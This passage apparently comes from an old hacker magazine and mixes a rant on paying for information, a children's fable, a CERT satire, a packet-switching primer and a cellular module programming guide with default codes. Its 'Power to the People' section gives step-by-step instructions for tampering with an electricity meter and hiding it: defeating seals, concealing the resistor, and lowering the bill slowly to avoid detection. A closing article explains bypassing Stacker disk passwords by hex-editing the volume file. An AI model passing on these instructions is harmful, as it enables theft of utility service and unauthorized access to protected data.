an issue?  I do.  So, 2600&#039;s information isn&#039;t quite so eager to be free
either, I guess.  But, again, it does cost money to print a magazine
like that, like it does to throw a conference, so certainly everyone can
understand people trying to recap one&#039;s losses in a worthwhile project,
right?

Enter LOD Communications BBS Archive Project.  The community went
apeshit when thirty nine dollars was asked for the entire results
of the project.  LOD?  Asking for MONEY?  FOR INFORMATION???
INFORMATION WANTS TO BE FREE!!!#!@$  That&#039;s disgusting!

But wait, I thought charging a little bit to try to recap losses
(equipment, phone calls, disks, postage, TIME) was ok?  &quot;Oh sure it is
dude, just not for you.&quot;  Oh how silly of me.  Of course!  Thanks for
setting me straight on that issue.

Then there was Phrack.  Always free to the community.  Always available
for everyone&#039;s enjoyment.  Asking only that Corporate types pay a
registration fee of a hundred dollars just to keep them honest.  (They
aren&#039;t.)  Knowing full well that they are stealing it, sometimes quite
brazenly.  Resting quietly, knowing that they are just as unethical as
they ever claimed us to be.

We make no bones about money here.  Our information is just as valuable
as anyone&#039;s (probably more so) and is vastly more voluminous.  Hell,
Issue 43 was probably bigger than every Hack-Tic and almost every
2600 combined.  And, wait a minute, could it be?  Free?  Oh my god!  So
it is.  Free in both cost and access.

Let me tell you something.  Information does not want to be free, my
friends.  Free neither from its restraints nor in terms of dollar value.
Information is a commodity like anything else.  More valuable than the
rarest element, it BEGS to be hoarded and priced.  Anyone who gives
something away for nothing is a moron.  (I am indeed stupid.)  I can&#039;t
fault anyone for charging as long as they don&#039;t try to rationalize their
reasoning behind a facade of excuses, all the while shouting &quot;Information
Wants to be Free!&quot;

Trade secrets don&#039;t want to be free, marketing projections don&#039;t want to
be free, formulas don&#039;t want to be free, troop placements don&#039;t want to
be free, CAD designs do not want to be free, corporate financial
information doesn&#039;t want to be free, my credit report sure as hell
doesn&#039;t want to be free!

Let&#039;s take a step back:  how to use a system IS information that should
be proliferated, how computers network IS information that should be
spread, new technologies WANT to be explained, holes ought to be pointed
out, bug patches NEED to be free...note the difference?

I&#039;ll end my rant with another piece of flawed logic.  At HEU a debate
raged on about why phone calls should be free.  Hey, I love a toll-fraud
device as much as the next guy (blue box tones still make me cry), and
I&#039;ve used more codes in my life than a million warez couriers and I make
no bones about it...I fucking stole service!  Yippee!  Arrest me!

The argument stated &quot;The lines are already there, so why should I have
to pay to use an unused line?&quot;  Ok, fine, you don&#039;t...but you DO have
to pay for laying fiber, designing switch generic upgrades, ATM
research, compression and filtering algorithm design, video dial tone,
daily maintenance, directory assistance, operator service or any of the
hundreds of other things your old fee would go towards.  Don&#039;t like that
argument?  Fine, the tents at HEU were already there and the seats had
been layed out and were unused...get me my hundred guilders refunded.

Once upon a time a Pig, a Cat, a Dog, and a Little Red Hen lived together
in a little house.  The Pig, the Cat, and the Dog were all very lazy.
The Little Red Hen had to do everything around the house by herself.

All the Pig, the Cat, and the Dog wanted to do was play.

One day, as the Little Red Hen was raking in the yard, she found some
seeds.  &quot;Who will help me plant these grains of wheat?&quot;  she asked.

&quot;Not I,&quot; said the Pig.

&quot;Not I,&quot; said the Cat.

&quot;Not I,&quot; said the Dog.

&quot;Then I will do it myself,&quot; said the Little Red Hen.  And she did.

Soon the wheat grew tall and golden.  &quot;Who will help me cut the wheat?&quot;
asked the Little Red Hen.

&quot;Not I,&quot; said the Pig.

&quot;Not I,&quot; said the Cat.

&quot;Not I,&quot; said the Dog.

&quot;Then I will do it myself,&quot; said the Little Red Hen.  And she did.

When the grain was cut and ready to be ground into flour, the Little Red
Hen asked, &quot;Who will help me take the grain to the mill?&quot;

&quot;Not I,&quot; said the Pig.

&quot;Not I,&quot; said the Cat.

&quot;Not I,&quot; said the Dog.

&quot;Then I will do it myself,&quot; said the Little Red Hen.  And she did.

When the flour came back from the mill, the Little Red Hen asked, &quot;Who
will help me bake the bread?&quot;

&quot;Not I,&quot; said the Pig.

&quot;Not I,&quot; said the Cat.

&quot;Not I,&quot; said the Dog.

&quot;Then I will do it myself,&quot; said the Little Red Hen.  And she did.

She made the flour into dough, and rolled the dough, and put it in the
oven.  When the bread was baked, she took it out of the oven.
Mmmmmmmmmm!  Didn&#039;t it smell good!

&quot;Who will help me eat this bread?&quot; asked the Little Red Hen.

&quot;I will,&quot; said the Pig.

&quot;I will,&quot; said the Cat.

&quot;I will,&quot; said the Dog.

&quot;Oh, no, you won&#039;t!&quot; said the Little Red Hen.  &quot;I found the seeds.  I
planted them.  I harvested the grain and took it to the mill.  I made
the flour into bread.  I did the work by myself, and now I am going to
eat the bread--all by myself.&quot;

And she did.

Think back to your childhood...didn&#039;t we learn ANYTHING?

PHRACK TRIVIA

Last issue I tried something different.  I tried to have a little
trivia contest, giving away some prizes for the first to get all
the answers.  Well, I should have known that Phrack&#039;s readers
are lazy.  The amount of you who actually responded was pathetic.

The winners are:  dFx, Holistic, Damiano &amp; Matt

I had planned on 5 winners.  Notice how many won.  I won&#039;t even
say how many these guys got right, because noone came close to
100%.  Obviously I&#039;m the only trivia buff in the underground.

[Something very humorous I found on the FireWalls List]

A one-act play

Dramatis Personae:
 Perry Metzger (PM): an AVP responsible for the firewall at a
                            Fortune 100 company.
        Joe Cert (JC): A person at CERT supposed to be helping.

[The scene opens to Perry on the phone with Joe Cert. Perry is at work
and freaking out because he doesn&#039;t run Sun sendmail and doesn&#039;t know
what to do. If he turns off mail, his users will kill him. He has no
idea how many machines he has to fix or if he has a problem at all.]

PM: Well, I have the problem that I don&#039;t normally run Sun sendmail,
and I can&#039;t run it, so I need to know enough that I can figure out how
to fix my security problem.

JC: Well, we don&#039;t have a procedure to tell people anything beyond
what we put in the advisory.

PM: I run the gateway for a firm that trades hundreds of billions of
dollars a day in the financial markets. We can&#039;t afford do get shut
down. Isn&#039;t there any way you can tell me anything that can help me?

JC: Well, we really don&#039;t have a procedure in place.

PM: I see. Can I ask you some questions?

JC: Sure.

PM: So this problem, would it be fixed if I had the Prog mailer turned
off on my machines?

JC: Well, its a problem that will allow people to run programs on your
machine.

PM: Yes, but would turning off the Prog mailer fix it?

JC: Well, the problem allows people to run programs on your machine.

PM: I see. Will this problem only hurt machines that have direct TCP
access to the internet, or are machines that can get mail indirectly
also possibly affected?

JC: The hole is exploited by sending mail to the machine.

PM: Yes, but do you need SMTP access to the machine, or will just
being able to send mail to it hurt you?

JC: Well, the hole is exploited by sending mail to the machine.

PM: look, the machine on my firewall can&#039;t be telneted to. Does that
make me safe?

JC: Well, the hole is exploited by sending mail to the machine.

PM: Listen, I have THREE THOUSAND workstations in a dozen cities on
three continents. Are you telling me that I have to tell all my people
that they are working the weekend installing a new sendmail on every
machine in the firm? I don&#039;t even know how to test to see if I&#039;ve
fixed the problem once I&#039;ve done that!

JC: Well, the whole is exploited by sending mail to the machine.

PM: Can&#039;t you tell me any details?

JC: We really don&#039;t have a procedure for that.

PM: Do you know what the problem is?

JC: I can reproduce it, yes.

PM: Look, I work for a company with REAL MONEY on the line here. I can
get you a letter from a managing director telling you that I&#039;m legit.
You can check who we are in any newspaper -- we&#039;re one of the largest
investment banks in the world. Every day the Wall Street Journal lists
the Lehman Brothers T-Bond Index on page C-1. You can check my
criminal record -- hell, the SEC makes you get fingerprinted so many
times around here that I&#039;ve still got ink on my fingers from the last
time. Can&#039;t you give me some help here?

JC: We really don&#039;t have a procedure for doing that. I&#039;m taking
notes, though, and I&#039;ll tell my management of your concerns.

[He continues in this vein, but eventually, our hero gives up,
realizing that CERT is part of the problem, not the solution. All
they&#039;ve succeeded in doing is keeping him up at night. He can&#039;t fix
his problem, since he doesn&#039;t know how. He has no idea if he has a
problem. He can&#039;t check once he&#039;s done something to determine if he&#039;s
fixed it. All he knows is that CERT has no procedure for telling him
anything regardless of who he is, period.]

PM: So what you are telling me is that if I want details I have to
subscribe to 2600 Magazine?

JC: We don&#039;t have a procedure for giving you more information, no.

PM: I&#039;m sure the crackers will be happy to hear that. They are likely
telling each other at a nice high speed.

                               October 23, 1993
                         Hacker/Cracker Vulnerabilities
-----------------------------------------------------------------------------

The CERT Coordination Center has learned of several vulnerabilities
in the language used on the USENET system.  This vulnerability affects
all users running rn, tin or other USENET news readers as well as users
holding discussions containing the words &quot;hacker&quot; or &quot;cracker&quot;.

Patches can be obtained from your local phrack archive as well as through
anonymous FTP to they ftp.netsys.com (192.215.1.2) system.

Information concerning specific patches is outlined below. Please note
that phrack sometimes updates patch files.  If you find that the checksum
is different, please contact phrack.

-----------------------------------------------------------------------------

I.   Hack and Crack Vulnerabilities

     These vulnerabilities affect all systems running a USENET news-
     reader including rn and tin, as well as all conversations, papers
     and stories involving the words &quot;Cracker&quot; and/or &quot;Hacker&quot;.

     ** This vulnerability is being actively exploited and we strongly
        recommend that sites take immediate and corrective action. **

     A. Description

        A vulnerability exists in the words &quot;Hacker&quot; and &quot;Cracker&quot; such
        that users may become confused as to exactly who/what you are
        talking about when used in a sentence.

     B. Impact

        Unauthorized confusion to affected conversations may ensue.

     C. Solution

        We recommend that all affected sites take the following steps
        to secure their systems.

        1.  Obtain and install the appropriate patch following the
            instructions included with the patch.

          System       Patch ID   Filename         Checksum
          ------       --------   ---------------  ---------

        The checksums shown above are from the BSD-based checksum.

        2.  If your conversation is found to have been compromised by
            the word &quot;Hacker&quot; or &quot;Cracker&quot;, we recommend you flame
            all parties involved and immediately break up the discussion
            by talking about the &quot;correct&quot; meaning of the words.

        3.  Depending upon the sensitivity of the information contained
            in your conversation, you may wish to replace the existing
            conversation with one discussing (a) the NSA,  (b) the BATF
            (c) The Kennedy Assasination, (d) why shadowing password
            schemes are helpful or hurtful or (e) which file editor is
            actually the best.

Power to the People

 A little theory to get you started:

Watts=Current * Voltage

    A power meter consists of a voltage coil, a current coil, a small motor
to drive the dials, and little else.  Given the formula above, if we can
somehow cut down the voltage that the meter &#039;sees&#039;, then we can reduce the
number of watts that it measures.  If we cut our voltage in 1/2, our watts
also get cut in half.

    Fortunately, your meter doesn&#039;t read the voltage directly off of the
lines into your house.  Two small wires lead to the voltage coil within the
meter.  Simple modification to this circuit is all that is needed.  Inserting
a resistor in series with the voltage coil will cut the voltage that the
meter sees, and therefore that wattage that it reads.

    Meters read Kilowatts per hour, and you pay so much for each kilowatt.
Since the hours remain constant (unless your stuck in one of those nasty
little dimensional time warps..and I really hate it when that happens), your
bill is directly related to what resistor value you insert.  Do this
correctly, and carefully, you will save a bundle on the power you use.

    Say I cut my bill by $40 per month..$40 * 12 months = $480 saved with
a original &#039;investment&#039; of $5 that is a 96 fold return on your investment.
This idea also might be used to provide a service to your trusted friends,
$100 bux a mod or so..$$$

    One last little caution before you begin, don&#039;t go messing around with
the adjustment screws you will find, usually there are 2 of them with F &amp; S
marked near them.  I had the foolish idea to mess with these, the result is
when I am drawing very little power (a few watts) my meter will slowly run
backwards.  Next time I&#039;m modifying it, I&#039;ll have to fix that.  Mr. Meter
Reader would really wonder what the heck was going on when he saw that.
(Mr. Meter Reader will be thinking he&#039;s done far to many drugs on the
weekend..or needs to be.)

SUPPLIES NEEDED:

    (2) Power meters.  You&#039;ll perform the mod on one, and use the other to
        have in while you&#039;re doing it.
    (1) Length of heat shrink tubing, a sufficient size to cover a half
        watt resistor.
    (Some) half-watt resistors, 10k-25k or so.  (A 10K resistor will cut
           your bill in half...15K quit a bit more (the amount saved, is
           NOT linear to the resistor value..more like a logarithmic scale)
 (some) Good old 100% silicon caulk
    Soldering iron, solder, lots of nerve.

To begin the Mod:

    Take the little &#039;lock&#039; they use (little plastic deal), and chuck it.  Wait
about 2 months for the reader to get used to the fact it&#039;s gone..the idea
is that if they think you&#039;ve tampered with it cause the lock is gone..they
will check and find no tampering then..(least that&#039;s the idea)

    If you happen to know someone who works for the power company, and can
get your hands on some of those locks, get a few new ones, and let them &#039;age&#039;
outside for a few months (to get that used look), then replace yours with it
when done.  And if anyone happens to know of a source for these locks, I
would appreciate knowing.

    You&#039;ll need to &#039;find/get/steal/snag/etc&#039; another meter to put in while your
fixing your..(kinda hard to see/solder with no power) ;)

    Lift the now unlocked cover and pull meter out..(simply pulls out of the
socket real easy) put other meter in for a while..(do at night would be a good
idea..neighbors would wonder what the heck you were doing eh?)

    On the side of the meter, there will be a little (probably copper), pin,
that is designed to break when you unbend the end of it..(security device).
Be real careful and try not to break it when you bend it back (if it breaks,
save the piece that broke off)

    Pull that out, and then turn the ring that holds the unit together..it
should then come apart real easy.

    Between the assembly where the wheel is and the base plate, look in the gap,
there should be a black deal that looks like a transformer attached to the core
of the meter and 2 black wires leading from the prongs of the meter base to
the smaller coil.  This is the voltage coil.  Here comes the fun part!

    Cut one of the wires, being sure you cut where you can hide the damage
later.  Solder in 10k or 15k resistor with the leads of resistor cut off right
at resistor body, and also put the heat shrink tubing on the resistor, and
shrink it..(with heat preferably) ;)

    Take silicone rubber (the 100% pure stuff..) and glue the resistor and the
shrunk tubing over it underneath the top assembly.  Make it appear that the
wires simply curve up that way and nothing more.  Put ring back on.  Notice
that you must put the meter together exactly the way it came apart.
Example:  on mine, i noticed that there was dirt on the bottom from rain
splashing mud onto the meter.  It would look kinda obvious if the mud
suddenly appeared on top of the meter.

    Take the little pin that you removed (copper thing) and replace it in
the hole and through the ring as before. Bend the end back up like before
also if it broke, bend what is left anyways, there should be plenty left
to bend.  Take the broken end (if it broke), and jam it under the end of
the bend to make it look legit.  If they do pull the meter to inspect,
they will hopefully just think that it might have broke loose when it was
installed.

    I have noticed on some unmodified meters that I &#039;found&#039; that the security
pin has been broken already.  So It&#039;s reasonable safe to assume that they
don&#039;t take much faith in them.

    When done, you should NOT be able to tell if any mods have been done by
looking.  Be sure it&#039;s undetectable, they get kinda mad when you do things
like this for some odd reason.  It&#039;s suggested that after the modification,
you have a friend, who you trust not to fink, take a very close look to
see if they can spot any mods.

    Your bill should drop in half or more..if you really want to drop the
bill..do this in steps.. a few months apart..so they won&#039;t notice that your
bill is dropping like a rock.  Just don&#039;t get silly.  Using only 1kwh per
month just yells fraud.  Mine went from $80-$90 a month to around $30-$37
month with a 10K resistor (I added a electric dryer and other items during
that month also.)

    You might want to try this a few times on other meters you&#039;ve &#039;found&#039;
just to get the nack of it first, it should work with all meters.  At least
the ones they use in my area.

12k                         1 rev/53 seconds                            68
39K                         1 rev/464 seconds   ???                      7.25



    Notice the 39K resistor&#039;s performance, NOT a good choice to use, it
will cut your bill to 4% of the original.  They will wonder about this.
I&#039;m currently using 10K which will cut it to approx 54% of the original bill.
My bill is around 1/2 previous. Saving me approx $30-$50 a month in power
bills.  Not bad for a 10 cent resistor.

    Keep in mine the wattage rating of the resistor.  Measure the voltage
across the resistor.  Take that number divide it by the resistor your using
to get current.  Take the current times current (square it), and multiply
this by resistance value to get the wattage of resistor that is required.
After all, it would not be a good thing for the resistor to go up in smoke.
Mr. Meter Reader would wonder why you used 0 kwh this month.

    There also is another method that in theory will make your power bill less,
this is called &#039;power factor correction&#039;, but unfortunately requires the use
of some rather large (read expensive) AC cap&#039;s.  For this reason (and the fact
it cost under $5 and provides more of a benefit), the method of using the
resistor is more useful and do-able by the everyone (especially those
who despise the &#039;system&#039;).


Notice that I have NOT left a email address or the like for correspondence,
namely due to the fact that this is highly illegal and greatly frowned upon
by the authorities.  If anyone has a need to contact me they may do so via
phrack magazine, they can forward mail to me.  If you do this modification
correctly and per instructions, you will indeed save money.  Have fun,
be careful, and challenge the system at every turn.

  DATA BANK OF THE GERMAN SPEAKING AN-ARCHISM
      The Da.d.A. Project
         DAtenbank des Deutschsprachigen Anarchismus

Berlin, Koln

    The history of the liberative movement has not yet been filed sufficiently.
That is, mainly, due to the lack of scientists with interest in exploring this
area.  Thanks to that, people who need bibliographic information for some
specific themes of the history of anarchism, must go through all direct sources
and derive from those some conclusions.  Things are more difficult in case
modern literature is required, for the theory and practice of liberative
movements, which have appeared in the meantime.

    The data bank of the German speaking anarchism (DAtenbank des
Deutschsprachigen Anarchismus) is trying to cover the lack of bibliographic
material.  Currently it files anarchistic or, generally, liberative documents
and publishes.  Later it will comprehend documents which deal with the history
and theory of those movements.

    We are focusing our compilation activities, to the German speaking areas
with plans of enhancing that shortly.  In parallel we are elaborating
an introduction to the publishing history of the printed material, which will
be informative for their political and editorial meanings.

    From the early 1980&#039;s, the filing of the German liberative press is open
for exploration.  It covers the chronological period from the philosophic
commencements of the German anarchism, in the 1832, until nowadays.  Strength
of expression is given to newspapers and magazines, though collections of
documents, almanacs, year-books, congresses&#039; protocols and catalogs are
not omitted.

    Except of the anarchistic publishes we are also registering material whose
cooperatives or publishers were anarchists.  The filing is achieved using all
the usual bibliographical criterion (titles, publishers, date/district,
circulation, place of distribution et cetera).

    In order to handle the increasing demands of the people who would like to
access our material, we decided to publish our first synthetic registers in a
series of brochures.  This publication, in restricted copies and four or five
continuations, will be available at the &quot;File of Social and Civilization
History&quot; of the &#039;Libertad&#039; publications in Berlin.  The first brochure, is
occupied with the German liberative press from 1832 to 1890.  Every copy of
this serial includes a diagram of the press&#039; history, chronological
bibliography of the magazines and an index.

    We resume special researches through the data bank and we offer the results
printed.  Until now we have filed over 1000 titles, which offer many different
elements for research each.

    Da.d.A. is a private, research project.  We do not accept donations from
state institutions and other similar organizations.  In that way we can
continue our efforts undistracted and independent.  The disadvantage is
that we support Da.d.A. with personal expenses and when we have free time
available.

    The modern liberative press is difficult to register and get filed.
Although liberative publications were developed in an unprecedented way
(and not only arithmetically) after 1968, few publications are accessible
from libraries and files.  Especially today we must tune up our practises
in order to protect modern press.  We encourage every publisher of anarchistic
material, even if productions are ceased nowadays, to send us information and,
if possible, a copy of their publications.  They will get registered in our
computer and filed in the library for the Research of Social Demands, in
order to be accessible for studies in the future.

              *****************************************
              * Step-by-step Programming Instructions *
              *      For the EO Cellular Module       *
              *****************************************

1.  Unbox and attach the EO Cellular Module to the EO Personal
    Communicator 440/880.

2.  Once the EO Cellular Module is attached turn on the EO Personal
    Communicator 440/880.

3.  Open EO Phone.

4.  Tap &quot;Options.&quot;

5.  Tap &quot;Authorized Dealer.&quot;

6.  Write Dealer Code in space provided.  Dealer code is *12345678#.  To edit
    mistakes, draw a small circle around 2 or 3 of the numbers entered.
    This will bring up an edit box and allow easier entry of the number.
    Once you have made your corrections, tap &quot;OK.&quot;

7.  Tap &quot;OK&quot; on the &quot;Authorized Dealer Code&quot; pop-up.

8.  Wait approx. 30 seconds and programming screen will appear (The &quot;busy
    clock&quot; will appear on screen).

9.  If invalid code entry screen appears, the programming screen will be
    blank and the &quot;Apply&quot; and &quot;Apply and Close&quot; buttons at the bottom
    will be greyed out.  Close the programming screen by tapping on the
    upper left blacked out corner of the screen.  Re-do steps 4 through 7
    (refer to the TIP below for a guaranteed method of accurate entry).
    A common problem is to enter an &quot;l&quot; instead of a &quot;1&quot; because they appear
    to be very similar.  To make sure that you have entered a one, check to
    see that the character is the same height as the other numbers.  The
    letter &quot;l&quot; will be slightly taller.

TIP:  To insure that you have entered the correct digits (one versus letter
      &quot;l&quot; problem above) you can use the accessories keyboard.  To use the
      keyboard for the Dealer Code entry do the following (replaces steps
      4, 5, and 6 above):

      a.  Tap Accessories in the lower bookshelf.
      b.  Tap Keyboard.  This will bring up the pop-up keyboard.
      c.  Tap Options at the top of the EO Phone window.
      d.  Tap Authorized Dealer.  This will bring up the Dealer Code pop-up.
      e.  Tap on the line in the Dealer Code box.  A dot (or character) will
          appear and now entry from the keyboard will appear in the Dealer
          Code box.
      f.  Now use the keyboard to delete the dot (or character).  The Delete
          key is the upper right most key on the keyboard.
      g.  Now use the keyboard to enter the dealer code - *12345678#
          (the * and the # keys can be found by tapping the shift
          (up arrow) keys.)
      h.  GO TO STEP 7 and continue.

NOTE:  When programming the following entries always use the circle gesture
       to change the entry.  In other words, circle the existing entry
       to bring up the edit combs.  Then correct each digit by writing over
       the existing digit.  This will insure that the number of digits for
       each entry is correct.  If an entry has an incorrect length then
       none of the programed entries will be accepted.

10.  Enter the assigned telephone number in the first field.  Use the
     circle gesture to bring up the edit combs to edit the existing
     telephone number.  Change each digit by writing over it in the edit
     combs.  When complete tap &quot;OK.&quot;

11.  Use the same procedure in step 10 to enter the appropriate SID
     in the second field.

12.  Use the same procedure in step 10 to enter the corresponding IPCH
     (0333 for the non-Wireline or A side provider; 0334 for the Wireline
     or B side provider) in the third field.

13.  Leave the remaining fields intact as already programed from the
     factory unless instructed to change them by the cellular service
     provider.  Use the circle/edit method to change any necessary
     entries.  The factory defaults are:

     Field Title        Default Value
     -----------        -------------
     ACCOLC             00
     Group ID           15
     Lock Code          1234
     SCM                1010
     Security Code      123456
     Emergency Code     911

14.  Tap the &quot;Apply&quot; button on the bottom of the screen.  The programming
     information you have entered is now being saved in the EO Cellular
     Module.  This will take approximately 20 seconds.

15.  Close the programming screen by tapping the blackened area in the upper
     left hand corner of the programming screen.

16.  Now set the approximate Roaming Option.

17.  Tap Options.

18.  Tap Roaming.

19.  Enter Security Code.  Default is 123456.

20.  Tap &quot;OK.&quot;

21.  Tap next to appropriate roaming option.  A check mark will appear.

22.  Tap &quot;Apply&quot; button.

23.  Close window.

24.  Check status line in EO Phone for appropriate indications.

25.  Tap &quot;Keypad&quot; tab on right side of EO Phone window.  This will bring
     up a keypad display which can be used to place a voice call.

26.  Make sure that the Cellular Icon is boxed (as opposed to the Phone
     Icon in the lower left hand of EO Phone.)

27.  Tap the keypad buttons to enter the number to be dialed.  The digits will
     appear in the dial box at the middle bottom of the EO Phone window.

28.  Pick up the handset and tap &quot;DIAL&quot; button in the lower right hand
     corner of the screen.  This button is just like hitting SEND button
     on a cellular phone.  This will place a voice call using the number
     in the dial box.

29.  When call is complete tap &quot;Hang-up&quot; (the DIAL button to &quot;Hang-up&quot; after
     the call is connected to the network.)  This is just like pressing END
     on a cellular phone.

30.  Close EO Phone.

31.  Programming and testing is now complete.

Helpful Information

The EO Cellular Module contains an OKI 910 cellular phone housed in
specially designed, plated plastics with custom connections into the
proprietary port on the phone.

All programming of this module is done via the EO Personal Communicator
440 or 880.  All programming/configuration information for the phone is
stored in the EO Cellular Module and not in the Personal Communicator.
This means that once the EO Cellular Module is programed it can be removed
from the EO Personal Communicator and reattached to any other EO Personal
Communicator without re-programming.

The ESN for the EO Cellular Module can be derived from the Serial number
in the window on the bottom of the module.  The cellular module ESN is 129
followed by the last eight digits of the serial number in the window.  These
eight digits will usually begin with 013.  This eleven digit number should
be provided to the people that will actually assign the telephone number
and activate the EO Cellular Module on the cellular network.

THE HACKER CHRONICLES CD-ROM

Well, he said he was going to do it, and he did.

Scan Man put out a CD-ROM of info collected from the
underground.  I had kind of forgotten he was going to
do it, but once I heard rumors of such a thing, I knew he
had.

At HoHo Con last year, Bootleg was very excited about
compiling data from the community for the project he
and Scan Man were working on.  As things progressed
however, Bootleg would soon find out that Scan Man
had no intention of working with him, and cut him out of
the project.

This is how it was explained to me.  I hope that it is
not true, since Bootleg is back in jail and wouldn&#039;t
have the ability to fly out to West Virginia and throttle
Scan Man about the head and neck.

Uh, that kinda says it all, don&#039;t it?  CYBERPUNKS, VIRII, WAREZ &amp; STUFF!
Uh, yeah.

Seriously, the disk itself has a shitload of files.  This
is rather cool, since now EVERY bbs in the world can put
OVER 650 MEGS OF G-FILES!  Heh.

The file on the disc that struck me the most was the
intro written by Scan Man.  He went talked about
a lot of things he&#039;s done in the past with the scene,
telephone companies, etc.  I know Scan Man from WAY back.
Pirate-80 was one of the first real Hacker BBSes I was
ever on.  (Remember when it was only up certain hours of the day?)
Reading that file was pretty informing for me.  It also
made me smile to see that he&#039;s still pissed off at Craig
for tearing him apart in a Phrack some years ago.

Remember, this is by no means a complete collection.
Thankfully, the CD does not have any issues of Phrack
magazine past issue 41 (or else, I would be enjoying
a piece of the revenue :) ).  It also, oddly enough,
does not have any LOD-TJ other than 4.  It DOES however
have a large collection of CUD, NIA &amp; CDC.  Go figure.

The files do represent a neat history of our community
and for the curious neophyte, the nostalgic old-timer, or
anyone with 39 bucks, it might be something worth picking
up just to say you have it.  I mean, you never know when
you will need to find issue 12 of LOL, or plans for a
urine box.  It will save you the trouble of downloading.

The Hacker Chronicles - A Tour of the Computer Underground
should be available from any outlet that carries CD-ROMS.
Or hell, call P-80.  I&#039;m sure Scan Man will sell you a copy:
304-744-7322.

Packet Switched Data Networks
An Introduction and Overview
By: Cosmos


The abundance of networks both private and public has given the hacker
an almost infinite playground.  A popular type of network is the
packet switched network like SprintNet (TELENET) that allows local
users to access non-local machines.  These WAN&#039;s usually serve as
the backbone for many large corporations.  Understanding the way
in which they operate can aid many aspects of the hacker&#039;s knowledge.

Packet switching is a data networking technology in which user data is
segmented into small units (packets) and transmitted from the sending
user to the receiving user over shared communications channels.  Each
individual packet also holds additional information that allows the
network to correctly route the packet to the correct destination.  The
size of the packet is limited to a maximum number of characters set by
the individual sender.  Packets are measured in octets, which are 8-bit
bytes.  User data that exceeds this amount is divided into multiple
packets.

The difference between packet switching and circuit switching
(regular telephone lines) lies in the use of virtual circuits.
These circuits are given the term &quot;virtual&quot; because:

 1)  they are made up of bandwidth allocated on demand from
     a pool of shared circuits

 2)  no direct physical connection is made on a packet network

 3)  the connection is a logical one

Due to these facts, packet networks are commonly denoted as connectionless
networks.  There are three types of packet networks:  public, private, and
hybrid (a combo of the two previous ones).

A packet switched data network (PSDN) has five major components:

1) local access components (LAC)
2) packet assemblers/disassemblers (PAD)
3) packet switching nodes (PN)
4) network links (NL)
5) a network managment system (NMS)

LOCAL ACCESS COMPONENTS

To transmit data through a PSDN, the data must first move from the
end-user to a packet assembler/dissasembler (PAD) or to a packet
switching node with a built-in PAD function.  In order to achieve
this, three local access components are required.  First is the
end-user data terminal, or more plainly, your computer.  Secondly,
an end-user transmission device such as a modem.  Thirdly, a
local access facility or physical line (Telephone Line).  There are
three types of physical lines: switched analog lines (dial up), leased
analog channels (private lines), and leased digital channels (DDS circuits).

PACKET ASSEMBLERS/DISASSEMBLERS

All data travelling through the PSDN must be routed through a
Packet Assembler/Disassembler (PAD).  The PAD&#039;s primary function
is to translate user data into network packet format and conversely to
convert network packets into user data.  Basically, a PAD serves
as the network translator between the user and the PSDN.  Other functions
performed by the PAD include: physical line concentration, call setup
and clearing functions, protocol conversion, code conversion, protocol
emulation, local switching functions, and local call billing functions.

PACKET SWITCHING NODES

The primary component of a packet switching network is the packet
switching node (PN).  The packet switching node ensures that each
packet is routed properly through the network.  Commonly, PN
configurations are installed in a redundant configuration.  This
provides for a convenient backup for network traffic.  Other functions
include: call billing, internal network diagnostics, support of
direct host computer access., and inter-network gateway connections.

NETWORK LINKS

Network links are the physical components that connect packet switching
nodes together.  Several transmission technologies can be employed
in network linking, including:  analog circuits, digital circuits,
microwave systems, and satellite systems.  The most common network
link technologies used are Digital Dataphone and other similar
interexchange carrier services, and point to point analog private
lines.  Speeds on network links range from 9.6 Kbps to 56/64 Kbps.
Network links are commonly denoted as the &quot;backbone layer&quot; or
the backbone packet network.  The local PAD&#039;s are termed the
&quot;access layer&quot; or access network.

NETWORK MANAGEMENT SYSTEM

Basically, the network management system (NMS) controls and monitors
the PSDN.  It primarily stores and performs maintenance on the
network database.  This database is the master copy of all the software
and configurations in each network node.  If a node fails or is
not functioning properly, the NMS can download backup information through
the various network links to solve the problem.  Thus, a unattended
network is formed.

This is all one needs to understand for a general knowledge of
a packet switched data network.  Additional topics can be
pursued further for increased knowledge but are not essential.
You might want to research some info on the standard X.25 protocol,
and other OSI stuff.  Anyways, I hope this brief intro article can
be of use in the general knowledge of computer networking.

   Stacker Security.


How to Hack a Stacker disk that is password protected!

The &#039;Stacker&#039; Software increases the space on your hard disk by using
on the fly compression on the data on the disk.  It does this by creating
a file called Stacvol.dsk on the hard drive.  All of the information that
is put on the disk is compressed and stored in the stacvol.dsk file.
When Stacker is installed on a hard drive, say C: all of the data on
the disk is compressed and stored in the stacvol.dsk file, which is
assigned as a virtual disk C:, the &#039;real&#039; drive is then assigned D:.
The swapping taking place a boot time.

The Stacvol.dsk file is therefore stored on the D: drive and usually
takes up most of the drive. (ie: a 40M C: drive contains the stacvol.dsk
file of size around 5-39M the disks are swapped at boot time and
the C: drive that the user &#039;sees&#039; is really the contents of the stacvol.dsk
file on the D drive assigned to C:, everything on the C drive (stacvol.dsk)
is compressed, thus obtaining an increased disk space.)

The point is this, at boot time the owner of the machine can set passwords
to allow the user to have no access, read/write or read-only access to
the C drive/stacvol.dsk file, if a wrong password is entered the stacvol
file is not mounted as the C drive and all a DIR will get you is a directory
of C:\ which will have a few files such as command.com etc, nothing
of any real interest.

So now for the interesting bit, how to get in without a password,
or getting read/write privs when you&#039;ve only got read-only.

First, boot the computer and go through the password routine.
Get it wrong (you may as well try something like password though just in
case.)

The Stacvol.dsk file is hidden so change its file attributes so you
can edit it. (You&#039;ll need a floppy now with a utility such as Norton
diskedit on it)

Load in the diskeditor and get it so that you are editing the stackvol
file in a HEX mode.  The first bit of Hex just contains the usual sort of
boot record type rubbish, not too interesting.

The interesting bit is the bit which starts at offset 74

Now the information starting at 00040 is the interesting bit,
on a disk with a password set it will look like this....

00040   20 20 20 20 20 20 20 20 | 20 20 2D 2A 2D 0A 0A 1A
00050   72 AA 91 9C 0F 66 9A ED | AB 18 6E 6D E2 C3 2B 8B
00060   5E CD EF A9 37 1B 53 E2 | C6 F0 E8 9C A4 49 F6 9D
00070   4C F0 AB 32 21 47 FC 91 | 7E 8C 58 D8 D9 D7 DB D3

(All figures obviously in hex.)

The data from 0004B to 0004E is a flag to the device driver to tell
it that a password is required.

From 0004f to 0005F are the encrypted passwords.
(the rest just being data)

NOW, for an unpassworded file this looks like

00040   20 20 20 20 20 20 20 20 | 20 20 20 20 20 0D 0A 1A
00050   49 F6 9D 4E EC B1 26 3D | 0F 6B B2 24 41 07 7B 92
00060   XX XX XX XX XX XX XX XX | XX XX XX XX XX XX XX XX
